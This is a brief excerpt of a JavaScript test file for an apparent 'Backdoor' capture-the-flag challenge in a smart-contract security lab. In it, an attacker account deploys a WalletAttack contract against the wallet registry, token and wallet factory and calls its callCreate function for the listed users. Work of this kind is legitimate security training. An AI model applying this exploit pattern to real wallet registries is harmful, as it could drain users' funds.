...
describe("[Challenge] Backdoor", function () {
  ...
  it("Exploit", async function () {
    ...
    this.walletAttack = await (
      await ethers.getContractFactory("WalletAttack", attacker)
    ).deploy(
      this.walletRegistry.address,
      this.token.address,
      this.walletFactory.address
    );
    await this.walletAttack
      .connect(attacker)
      .callCreate(this.masterCopy.address, this.walletRegistry.address, users);
  });
